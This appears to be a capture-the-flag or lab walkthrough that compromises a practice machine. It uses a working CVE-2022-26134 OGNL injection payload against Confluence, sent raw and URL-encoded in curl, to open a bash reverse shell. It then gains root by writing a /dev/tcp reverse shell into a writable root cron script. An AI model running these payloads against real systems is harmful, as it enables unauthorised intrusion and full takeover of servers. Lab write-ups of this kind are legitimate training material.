I performed an aggressive port scan, using the command sudo nmap -sV -A 192.168.219.41 -p 22,8090,8091, against the three TCP ports and received the result above. By the looks of it, the target machine is running HTTP applications on both higher ports. I will begin enumeration with the HTTP application on port 8090.

Enumeration

Port 8090: HTTP

The webpage above is displayed for this port. The target machine seems to be running Atlassian Confluence 7.13.6.


From previous experience, I know this application version is vulnerable to unauthenticated RCE. It has the CVE of CVE-2022–26134. This website above also contains the PoC to perform RCE. Time to test it.

Exploitation

${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/192.168.45.214/80 0>&1').start()")}
${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/192.168.45.214/80 0>&1').start()")}

I modified the PoC code I found from the previous website to start a reverse shell connection to my machine at port 80.

curl -v http://192.168.219.41:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.214/80%200%3E%261%27%29.start%28%29%22%29%7D/
curl -v http://192.168.219.41:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.214/80%200%3E%261%27%29.start%28%29%22%29%7D/

And now I added the curl request with the target machine's IP address and the URL-encoded payload. This payload will invoke a reverse shell connection to my machine at port 80. Therefore, I started a listener on my machine at port 80.


In the image above, there are two terminals: the top one is where I deploy my payload, and the bottom one is to catch the reverse shell connection. After deploying the payload, I instantly obtained a reverse shell connection from the target machine on my machine at port 80 with the session as confluence. Now I have a foothold on the target machine.

Privilege Escalation


I transferred pspy64 to the target machine and executed it. Then I obtained the useful information shown above. The cronjob with the name log-backup.sh at /opt directory gets executed as the user root as it has the UID of 0. Do I have write privileges over this file?


And bingo! I do! I can modify the contents of this file to put my reverse shell script inside it. I will need to change the permission of the file to be executable once I modify it.


Firstly, I inserted echo "#!/bin/bash" > /opt/log-backup.sh inside the /opt/log-backup.sh file. Then, I inserted the reverse shell payload echo '/bin/bash -i >& /dev/tcp/192.168.45.214/8443 0>&1' >> /opt/log-backup.sh inside the file. This bash reverse shell script will invoke a reverse shell connection to my machine at port 8443. And finally, I changed the permission of the /opt/log-backup.sh file to be executable using the command chmod +x /opt/log-backup.sh. In the image above, the top terminal is where I change the contents of the log-backup.sh file and the bottom terminal is where I catch the reverse shell. I successfully obtained a root reverse shell on my machine at port 8443. GG.
